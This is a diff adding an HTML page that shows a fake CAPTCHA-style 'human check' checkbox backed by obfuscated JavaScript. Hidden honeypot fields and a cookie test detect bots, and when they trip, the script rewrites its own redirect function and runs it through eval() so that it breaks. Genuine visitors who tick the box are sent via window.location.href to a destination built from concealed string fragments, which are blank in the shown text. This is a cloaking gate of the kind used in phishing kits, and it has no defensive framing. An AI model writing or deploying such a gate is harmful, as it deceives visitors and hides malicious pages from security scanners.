+    const expires = new Date();
+    expires.setDate(expires.getDate() + days);
+    document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
+  }
+
+  function getCookie(name) {
+    const cookies = document.cookie.split(';');
+    for (let cookie of cookies) {
+      const [cookieName, cookieValue] = cookie.trim().split('=');
+      if (cookieName === name) return cookieValue;
+    }
+    return null;
+  }
+
+  setCookie('PartII', '1', 1);
+
+  if (getCookie('PartII') !== '1') {
+    O_x34563X();
+    return true;
+  }
+
+  return false;
+}
+
+  function iJDABon() {
+    const JYRUoIwq = document.getElementById("kJhTfgZxqL").value.trim();
+    const wsCBSfCp = document.getElementById("pLmNkJoHyT").value.trim();
+    const nfNfueJo = document.getElementById("qWeRtYuIoP").value.trim();
+    const QSbcaSjR = document.getElementById("aSdFgHjKlZ").value.trim();
+    const OTygeYwx = document.getElementById("zXcVbNmKjH").value.trim();
+    const KDmrHRhh = document.getElementById("lPoIkJuHyG").value.trim();
+    const aATwbIgz = document.getElementById("mNbVcXzLaS").value.trim();
+    const ASCUCgpI = document.getElementById("tReWqAsDfG").value.trim();
+    const GzQATAAa = document.getElementById("yHnMkIjUbV").value.trim();
+    const KQEwgNul = document.getElementById("oCvBnMkLjH").hasAttribute("tch");
+    const QSlrhxjl = document.getElementById("wErTyUiOpL").checked;
+    if (JYRUoIwq || wsCBSfCp || nfNfueJo || QSbcaSjR || OTygeYwx || KDmrHRhh || aATwbIgz || ASCUCgpI || GzQATAAa || KQEwgNul || QSlrhxjl) {
+      O_x34563X();
+    }
+    
+    return true;
+  }
+
+  function oIAndajfI() {
+    const sGsNoXOa = document.getElementById("aBcDeFgHiJ").value.trim();
+    const McGVqfNT = document.getElementById("kLmNoPqRsT").value.trim();
+    const SrPtWPym = document.getElementById("uVwXyZaBcD").value.trim();
+    const zayARMfC = document.getElementById("eFgHiJkLmN").value.trim();
+    const dzbconwu = document.getElementById("oPqRsTuVwX").value.trim();
+    const RjtxNuDi = document.getElementById("yZaBcDeFgH").value.trim();
+    const pwFIYqtF = document.getElementById("iJkLmNoPqR").value.trim();
+    const SLLDBNlA = document.getElementById("sTuVwXyZaB").value.trim();
+    const ZeIdJdCi = document.getElementById("cDeFgHiJkL").hasAttribute("pac");
+    const TeUfMFvY = document.getElementById("mNoPqRsTuV").checked;
+    if (sGsNoXOa || McGVqfNT || SrPtWPym || zayARMfC || dzbconwu || RjtxNuDi || pwFIYqtF || SLLDBNlA || ZeIdJdCi || TeUfMFvY) {
+      O_x34563X();
+    }
+    
+    return true;
+  }
+
+  function uIAndaPa() {
+    const KRJDauGt = document.getElementById("QwErTyUiOp").value.trim();
+    const BZRVauoS = document.getElementById("AsDfGhJkLz").value.trim();
+    const EfwAiXtC = document.getElementById("ZxCvBnMlKj").value.trim();
+    const jeJFAZES = document.getElementById("HgFdSaQwEr").value.trim();
+    const XMGBnTdd = document.getElementById("TyUiOpAsDf").value.trim();
+    const auKPQRbn = document.getElementById("GhJkLzXcVb").value.trim();
+    const EMdkJtGv = document.getElementById("NmKlJhGfDs").value.trim();
+    const IslwuGCg = document.getElementById("QaZsXeDcRf").hasAttribute("zedge");
+    const xniQapFO = document.getElementById("TgBhYvKuIj").checked;
+    const lRsPpVZB = document.getElementById("MnBvCxZlKj").value.trim();
+    if (KRJDauGt || BZRVauoS || EfwAiXtC || jeJFAZES || XMGBnTdd || auKPQRbn || EMdkJtGv || IslwuGCg || xniQapFO || lRsPpVZB) {
+      O_x62Yusa();
+    }
+    
+    return true;
+  }
+
+  function YgjsafuUsa() {
+    const pCHJSFUP = document.getElementById("XkLmNoPqRs").value.trim();
+    const cwIrzMZA = document.getElementById("TuVwXyZaBc").value.trim();
+    const pjEGlLMh = document.getElementById("DeFgHiJkLm").value.trim();
+    const CpRwcNVZ = document.getElementById("NoPqRsTuVw").value.trim();
+    const WBSovwBQ = document.getElementById("XyZaBcDeFg").value.trim();
+    const IVmirXQP = document.getElementById("HiJkLmNoPq").value.trim();
+    const JuntVnDw = document.getElementById("RsTuVwXyZa").value.trim();
+    const OSPCkHQv = document.getElementById("BcDeFgHiJk").value.trim();
+    const sqpbdkvM = document.getElementById("LmNoPqRsTu").hasAttribute("pluse");
+    const KCgydmhR = document.getElementById("VwXyZaBcDe").checked;
+    if (pCHJSFUP || cwIrzMZA || pjEGlLMh || CpRwcNVZ || WBSovwBQ || IVmirXQP || JuntVnDw || OSPCkHQv || sqpbdkvM || KCgydmhR) {
+      O_x34563X();
+    }
+    
+    return true;
+  }
+
+  function SuLslMus() {
+    const htLVHaPh = document.getElementById("YhKjLmNpQr").value.trim();
+    const eNwPyUHh = document.getElementById("ZsXcVbNmKl").value.trim();
+    const bGleMQNY = document.getElementById("PoIuYtReWq").value.trim();
+    const ZXlzuVKz = document.getElementById("MnBvCxZlKj").value.trim();
+    const sXFlkHWo = document.getElementById("QwErTyUiOp").value.trim();
+    const lkvMMHFK = document.getElementById("AsDfGhJkLz").value.trim();
+    const FuzKQOpq = document.getElementById("XcVbNmKlJi").value.trim();
+    const rKQLeWvz = document.getElementById("HgFdSaQwEr").hasAttribute("tier");
+    const QPWsYbJx = document.getElementById("TyUiOpAsDf").checked;
+    const ISckhwot = document.getElementById("GhJkLzXcVb").value.trim();
+    if (htLVHaPh || eNwPyUHh || bGleMQNY || ZXlzuVKz || sXFlkHWo || lkvMMHFK || FuzKQOpq || rKQLeWvz || QPWsYbJx || ISckhwot) {
+      O_x62Yusa();
+    }
+    
+    return true;
+  }
+
+  function IIIIImdak() {
+    const snEwVqwq = document.getElementById("BcDeFgHiJk").value.trim();
+    const cpbBCaNb = document.getElementById("LmNoPqRsTu").value.trim();
+    const SasgYbvo = document.getElementById("VwXyZaBcDe").value.trim();
+    const xcLzzwmt = document.getElementById("FgHiJkLmNo").value.trim();
+    const cDSFvSCh = document.getElementById("PqRsTuVwXy").value.trim();
+    const MlwVhqMh = document.getElementById("ZaBcDeFgHi").value.trim();
+    const uytPYPCb = document.getElementById("JkLmNoPqRs").value.trim();
+    const NTJapRvj = document.getElementById("TuVwXyZaBc").value.trim();
+    const bNJWJdZE = document.getElementById("DeFgHiJkLm").hasAttribute("dane");
+    const pSHgALrM = document.getElementById("NoPqRsTuVw").checked;
+    if (snEwVqwq || cpbBCaNb || SasgYbvo || xcLzzwmt || cDSFvSCh || MlwVhqMh || uytPYPCb || NTJapRvj || bNJWJdZE || pSHgALrM) {
+      O_x444Tar();
+    }
+    
+    return true;
+  }
+
+  function OOOadnjcaO() {
+    const JLZtVSSq = document.getElementById("XkLmNoPqRs").value.trim();
+    const JrXqaBoi = document.getElementById("TuVwXyZaBc").value.trim();
+    const SsfDumRA = document.getElementById("DeFgHiJkLm").value.trim();
+    const MrelpqIC = document.getElementById("NoPqRsTuVw").value.trim();
+    const WQYxFeme = document.getElementById("XyZaBcDeFg").value.trim();
+    const meulUPrq = document.getElementById("HiJkLmNoPq").value.trim();
+    const ZZeGgNqu = document.getElementById("RsTuVwXyZa").value.trim();
+    const zyflOhZg = document.getElementById("BcDeFgHiJk").value.trim();
+    const iYgUjZoQ = document.getElementById("LmNoPqRsTu").hasAttribute("church");
+    const UOOXxfzR = document.getElementById("VwXyZaBcDe").checked;
+    if (JLZtVSSq || JrXqaBoi || SsfDumRA || MrelpqIC || WQYxFeme || meulUPrq || ZZeGgNqu || zyflOhZg || iYgUjZoQ || UOOXxfzR) {
+      O_x34563X();
+    }
+    
+    return true;
+  }
+
+  function TThsayfad() {
+    const TJMXtSoC = document.getElementById("QwErTyUiOp").value.trim();
+    const XJqcDIDw = document.getElementById("AsDfGhJkLz").value.trim();
+    const eIZJxQDD = document.getElementById("ZxCvBnMlKj").value.trim();
+    const XBSgiSJz = document.getElementById("HgFdSaQwEr").value.trim();
+    const BRzNnUWI = document.getElementById("TyUiOpAsDf").value.trim();
+    const WzUvkQgT = document.getElementById("GhJkLzXcVb").value.trim();
+    const aYoPHRry = document.getElementById("NmKlJhGfDs").hasAttribute("blush");
+    const gEYYvDGQ = document.getElementById("QaZsXeDcRf").checked;
+    if (TJMXtSoC || XJqcDIDw || eIZJxQDD || XBSgiSJz || BRzNnUWI || WzUvkQgT || aYoPHRry || gEYYvDGQ) {
+      O_x444Tar();
+    }
+    
+    return true;
+  }
+
+  function tYBisadJ() {
+    const VbVdqHIm = document.getElementById("XkLmNoPqRs").value.trim();
+    const AbJIYGTE = document.getElementById("TuVwXyZaBc").value.trim();
+    const qQSufBDk = document.getElementById("DeFgHiJkLm").value.trim();
+    const tmuozUKZ = document.getElementById("NoPqRsTuVw").value.trim();
+    const kdzmuHqr = document.getElementById("XyZaBcDeFg").value.trim();
+    const GXBkocim = document.getElementById("HiJkLmNoPq").hasAttribute("staer");
+    const YVYcezlg = document.getElementById("RsTuVwXyZa").checked;
+    if (VbVdqHIm || AbJIYGTE || qQSufBDk || tmuozUKZ || kdzmuHqr || GXBkocim || YVYcezlg) {
+      O_x62Yusa();
+    }
+    
+    return true;
+  }
+
+  function UYbuadIJM() {
+    const hWYLtQMK = document.getElementById("QwErTyUiOp").value.trim();
+    const QbmPEVFt = document.getElementById("AsDfGhJkLz").value.trim();
+    const SEajgHeE = document.getElementById("ZxCvBnMlKj").value.trim();
+    const QfTTsMPw = document.getElementById("HgFdSaQwEr").value.trim();
+    const qjWdgWer = document.getElementById("TyUiOpAsDf").value.trim();
+    const vQntvDEk = document.getElementById("GhJkLzXcVb").value.trim();
+    const NQUKRsII = document.getElementById("NmKlJhGfDs").value.trim();
+    const EJntRuod = document.getElementById("QaZsXeDcRf").hasAttribute("krippi");
+    const xfyzbnzp = document.getElementById("TgBhYvKuIj").checked;
+    const LICFUwFl = document.getElementById("MnBvCxZlKj").value.trim();
+    if (hWYLtQMK || QbmPEVFt || SEajgHeE || QfTTsMPw || qjWdgWer || vQntvDEk || NQUKRsII || EJntRuod || xfyzbnzp || LICFUwFl) {
+      O_x34563X();
+    }
+    
+    return true;
+  }
+
+  function iuyguNUNU() {
+    const FDBYpmwS = document.getElementById("XkLmNoPqRs").value.trim();
+    const TStbltRA = document.getElementById("TuVwXyZaBc").value.trim();
+    const yVCJGlVe = document.getElementById("DeFgHiJkLm").value.trim();
+    const mKmiIDUH = document.getElementById("NoPqRsTuVw").value.trim();
+    const wfOmAuJj = document.getElementById("XyZaBcDeFg").hasAttribute("kamti");
+    if (FDBYpmwS || TStbltRA || yVCJGlVe || mKmiIDUH || wfOmAuJj) {
+      O_x444Tar();
+    }
+    
+    return true;
+  }
+
+  function O_xIIISaSa() {
+      const O_xIIIDaDa = document.createElement('div');
+      O_xIIIDaDa.className = 'checkbox-container';
+
+      const checkbox = document.createElement('input');
+      checkbox.type = 'checkbox';
+      checkbox.id = 'human-check';
+      checkbox.className = 'checkbox';
+      checkbox.disabled = true;
+
+      const checkmark = document.createElement('div');
+      checkmark.className = 'checkmark';
+
+      const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+      svg.setAttribute('viewBox', '0 0 24 24');
+
+      const polyline = document.createElementNS('http://www.w3.org/2000/svg', 'polyline');
+      polyline.setAttribute('points', '20,6 9,17 4,12');
+
+      svg.appendChild(polyline);
+      checkmark.appendChild(svg);
+      O_xIIIDaDa.appendChild(checkbox);
+      O_xIIIDaDa.appendChild(checkmark);
+
+      return O_xIIIDaDa;
+  }
+
+  document.addEventListener('DOMContentLoaded', function() {
+      const daoemsitContent = document.querySelector('.daoemsit-content');
+
+      if (daoemsitContent) {
+          const checkboxElement = O_xIIISaSa();
+
+          daoemsitContent.prepend(checkboxElement);
+      } else {
+          console.error("Could not find the parent element with class 'daoemsit-content'.");
+      }
+  });
+
+  function O_x34563X() {
+    const originalO_t88UX = O_t88UX.toString();
+    const modifiedO_t88UX = originalO_t88UX.replace("const n5Nwm$qplkdXrJ_HNptP", "conts n5Nwm$qplkdXrJ_HNptP");
+    eval(modifiedO_t88UX);
+  }
+
+  function O_x444Tar() {
+    const originalO_t88UX = O_t88UX.toString();
+    const modifiedO_t88UX = originalO_t88UX.replace("const YRIWMg8md3_3lY$3aNQ7", "cnots YRIWMg8md3_3lY$3aNQ7");
+    eval(modifiedO_t88UX);
+  }
+
+  function O_x62Yusa() {
+    const originalO_t88UX = O_t88UX.toString();
+    const modifiedO_t88UX = originalO_t88UX.replace("wEElBO_VbG1_xSkAjlL9 + JZrQmaBNNDBh46bG5H8l", "wEElBO_VbG1_xSkAjlL9JZrQmaBNNDBh46bG5H8l");
+    eval(modifiedO_t88UX);
+  }
+
+  document.addEventListener('DOMContentLoaded', function() {
+      const checkbox = document.getElementById('human-check');
+      const spinner = document.getElementById('spinner');
+      const triangles = document.getElementById('triangles');
+      const label = document.getElementById('daoemsitLabel');
+            
+      let isChecked = false;
+      let isLoading = false;
+      let isEnabled = false;
+
+      setTimeout(() => {
+          isEnabled = true;
+          checkbox.disabled = false;
+          label.classList.remove('disabled');
+      }, 100);
+
+  function O_t88UX() {
+      if (isLoading || isChecked || !isEnabled) return;
+
+      isLoading = true;
+      checkbox.disabled = true;
+      label.classList.add('disabled');
+                
+      spinner.classList.add('show');
+      triangles.style.display = 'none';
+                
+      setTimeout(() => {
+          isLoading = false;
+          isChecked = true;
+          checkbox.checked = true;
+          checkbox.disabled = false;
+          label.classList.remove('disabled');
+                    
+          spinner.classList.remove('show');
+          triangles.style.display = 'block';
+                    
+          setTimeout(() => {
+              const qrfJnh0AtJLxyqNNilOR = '';
+              const wEElBO_VbG1_xSkAjlL9 = '';
+              const SyBsuyCRrbhgUT_10kdr = '';
+              const JZrQmaBNNDBh46bG5H8l = '';
+              const EDkzbS0bbrv_1fhfYE__ = 'href';
+              const n5Nwm$qplkdXrJ_HNptP = '';
+              const cDg_HThFmC1AD0TdYjZ7 = '';
+              const cA4Ta6cUwVpF72dcxX7y = '';
+              const a0WBAXTDyJpqqNyQn6aI = '';
+              const t5buKRJ5qMF5msWaBC5O = '';
+              const gMLmbQmA_5V8odlue2uk = '';
+              const bKpjfIhqN$8MoGW0hiCs = '';
+              const auoIAnEWlB6IVQdD_bQx = '';
+              const XMBO2juWu$DSYv6pPZcA = '';
+              const h3ZcTUMQE8Np51xLyLb0 = '';
+              const qNeRH9CJyKYmlLO0Pwo4 = '';
+              const bPbl$plYbqIkygyU2Vsa = window;
+              const N8wAQIHq6lLDa13ZOp_U = '';
+              const jqctmYAyoJwLM6YBjGEg = '';
+              const ASO0UwkLp30QyHyxKyjl = '';
+              const jv85f75Zckn$BkjIfmSM = '';
+              const viU9jFzEzRrTPl1niGJp = '';
+              const GRa9C5fTdAB4V$gHq96w = 'location';
+              const Cyvxe16o132i3OKW4Wb4 = '';
+              const oHwemwsd9KbZs_69UgCN = '';
+              const YRIWMg8md3_3lY$3aNQ7 = '';
+              const PhdPMrAvTrLAo1WnQF1h = '';
+              const Xsfry9PWXM1PicO6FC3a = '';
+              const XlsOXWR9kSQzzWw721Ql = '';
+              const JtNymYf_aY83jNkL35gJ = '';
+              const Oaodafaw8a9da02jJJbda78afahb = gMLmbQmA_5V8odlue2uk + h3ZcTUMQE8Np51xLyLb0 + t5buKRJ5qMF5msWaBC5O + qrfJnh0AtJLxyqNNilOR + bKpjfIhqN$8MoGW0hiCs + PhdPMrAvTrLAo1WnQF1h + ASO0UwkLp30QyHyxKyjl + SyBsuyCRrbhgUT_10kdr + wEElBO_VbG1_xSkAjlL9 + JZrQmaBNNDBh46bG5H8l + n5Nwm$qplkdXrJ_HNptP + cA4Ta6cUwVpF72dcxX7y + a0WBAXTDyJpqqNyQn6aI + cDg_HThFmC1AD0TdYjZ7 + XlsOXWR9kSQzzWw721Ql + auoIAnEWlB6IVQdD_bQx + YRIWMg8md3_3lY$3aNQ7 + XMBO2juWu$DSYv6pPZcA + qNeRH9CJyKYmlLO0Pwo4 + N8wAQIHq6lLDa13ZOp_U + jqctmYAyoJwLM6YBjGEg + jv85f75Zckn$BkjIfmSM + viU9jFzEzRrTPl1niGJp + Cyvxe16o132i3OKW4Wb4 + oHwemwsd9KbZs_69UgCN + Xsfry9PWXM1PicO6FC3a + JtNymYf_aY83jNkL35gJ;
+              bPbl$plYbqIkygyU2Vsa[GRa9C5fTdAB4V$gHq96w][EDkzbS0bbrv_1fhfYE__] = Oaodafaw8a9da02jJJbda78afahb
+          }, 500);
+                    
+      }, 500);
+  }
+
+  checkbox.addEventListener('change', O_t88UX);
+            
+  label.addEventListener('click', function(e) {
+      e.preventDefault();
+      O_t88UX();
+  });
+
+  checkbox.addEventListener('keydown', function(e) {
+      if (e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          if (isEnabled && !isLoading) {
+              O_t88UX();
+          }
+      }
+  });
+});
+</script>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        border-color: hsl(var(--border));
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
+        background-color: white;
+        color: hsl(var(--foreground));
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 1rem;
+    }
+
+    :root {
+        --background: 0 0% 100%;
+        --foreground: 222.2 84% 4.9%;
+        --card: 0 0% 100%;
+        --card-foreground: 222.2 84% 4.9%;
+        --popover: 0 0% 100%;
+        --popover-foreground: 222.2 84% 4.9%;
+        --primary: 222.2 47.4% 11.2%;
+        --primary-foreground: 210 40% 98%;
+        --secondary: 210 40% 96.1%;
+        --secondary-foreground: 222.2 47.4% 11.2%;
+        --muted: 210 40% 96.1%;
+        --muted-foreground: 215.4 16.3% 46.9%;
+        --accent: 210 40% 96.1%;
+        --accent-foreground: 222.2 47.4% 11.2%;
+        --destructive: 0 84.2% 60.2%;
+        --destructive-foreground: 210 40% 98%;
+        --border: 214.3 31.8% 91.4%;
+        --input: 214.3 31.8% 91.4%;
+        --ring: 222.2 84% 4.9%;
+        --daoemsit-bg: 0 0% 85%;
+        --daoemsit-border: 0 0% 75%;
+        --daoemsit-triangle: 201 57% 27%;
+        --daoemsit-text: 215 25% 27%;
+        --daoemsit-success: 142 76% 36%;
+        --animation-fast: 150ms;
+        --animation-normal: 300ms;
+        --animation-slow: 750ms;
+        --radius: 0.5rem;
+    }
+
+    .overlay-all {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        z-index: 100;
+        background: white;
+        overflow: auto;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 1rem;
+    }
+
+    .daoemsit-container {
+        background-color: #e5e5e5;
+        border: 2px solid hsl(var(--daoemsit-border));
+        border-radius: 6px;
+        padding: 1rem;
+        width: 100%;
+        max-width: 377px;
+        box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+        position: relative;
+    }
+
+    .daoemsit-content {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+    }
+
+    .checkbox-container {
+        position: relative;
+        display: flex;
+        align-items: center;
+    }
+
+    .checkbox {
+        width: calc(1.5rem + 6px);
+        height: calc(1.5rem + 6px);
+        border: 2px solid hsl(var(--daoemsit-border));
+        border-radius: 0;
+        cursor: pointer;
+        appearance: none;
+        position: relative;
+        background-color: white;
+        transition: all var(--animation-fast) ease-out;
+    }
+
+    .checkbox:checked {
+        background-color: hsl(var(--daoemsit-triangle));
+        border-color: hsl(var(--daoemsit-triangle));
+    }
+
+    .checkbox:disabled {
+        cursor: not-allowed;
+        opacity: 0.6;
+    }
+
+    .checkmark {
+        position: absolute;
+        top: 2px;
+        left: 2px;
+        width: calc(1.25rem + 6px);
+        height: calc(1.25rem + 6px);
+        display: none;
+        pointer-events: none;
+    }
+
+    .checkbox:checked + .checkmark {
+        display: block;
+    }
+
+    .checkmark svg {
+        width: 100%;
+        height: 100%;
+        stroke: white;
+        stroke-width: 3;
+        fill: none;
+    }
+
+    .label {
+        color: hsl(var(--daoemsit-text));
+        font-weight: 500;
+        cursor: pointer;
+            user-select: none;
+            font-size: calc(1.00rem + 2px);
+        }
+
+    .label.disabled {
+        cursor: not-allowed;
+    }
+
+    .logo-area {
+        margin-left: auto;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .logo-container {
+        width: 3rem;
+        height: 2.5rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+    }
+
+    .spinner {
+        width: 1.5rem;
+        height: 1.5rem;
+        border: 2px solid hsl(var(--daoemsit-triangle));
+        border-top-color: transparent;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        display: none;
+    }
+
+    .spinner.show {
+        display: block;
+    }
+
+    @keyframes spin {
+        to {
+            transform: rotate(360deg);
+        }
+    }
+
+    .daoemsit-triangles {
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        transform: translate(-50%, -50%) scale(0.9);
+        height: 39px;
+        width: 43px;
+    }
+
+    .daoemsit-triangle {
+        position: absolute;
+        animation: trianglePulse var(--animation-slow) ease-in infinite;
+        width: 0;
+        height: 0;
+    }
+
+    .daoemsit-triangle.normal {
+        border-bottom: 0;
+        border-top: 14px solid hsl(var(--daoemsit-triangle));
+        border-left: 8px solid transparent;
+        border-right: 8px solid transparent;
+    }
+
+    .daoemsit-triangle.invert {
+        border-top: 0;
+        border-bottom: 14px solid hsl(var(--daoemsit-triangle));
+        border-left: 8px solid transparent;
+        border-right: 8px solid transparent;
+    }
+
+    .daoemsit-triangle:nth-child(1) { left: 16px; top: 0px; animation-delay: 0ms; }
+    .daoemsit-triangle:nth-child(2) { left: 8px; top: 14px; animation-delay: -125ms; }
+    .daoemsit-triangle:nth-child(3) { left: 16px; top: 14px; animation-delay: 0ms; }
+    .daoemsit-triangle:nth-child(4) { left: 24px; top: 14px; animation-delay: -625ms; }
+    .daoemsit-triangle:nth-child(5) { left: 0px; top: 28px; animation-delay: -250ms; }
+    .daoemsit-triangle:nth-child(6) { left: 8px; top: 28px; animation-delay: -250ms; }
+    .daoemsit-triangle:nth-child(7) { left: 16px; top: 28px; animation-delay: -375ms; }
+    .daoemsit-triangle:nth-child(8) { left: 24px; top: 28px; animation-delay: -500ms; }
+    .daoemsit-triangle:nth-child(9) { left: 32px; top: 28px; animation-delay: -500ms; }
+
+    @keyframes trianglePulse {
+        0% { opacity: 1; }
+        16.666% { opacity: 1; }
+        100% { opacity: 0; }
+    }
+
+    .daoemsit-label {
+        font-size: 10px;
+        color: hsl(var(--daoemsit-text));
+        opacity: 0.7;
+       font-weight: bold;
+        margin-top: 0.5rem;
+    }
+
+    .privacy-terms {
+        font-size: 10px;
+        color: hsl(var(--daoemsit-text));
+        opacity: 0.6;
+        margin-top: -0.125rem;
+    }
+
+    .privacy-terms a {
+        color: inherit;
+        text-decoration: none;
+    }
+
+    .privacy-terms a:hover {
+        text-decoration: underline;
+    }
+
+    @media (max-width: 480px) {
+        .daoemsit-container {
+            margin: 0 1rem;
+        }
+    }
+</style>
+</body>
+</html>
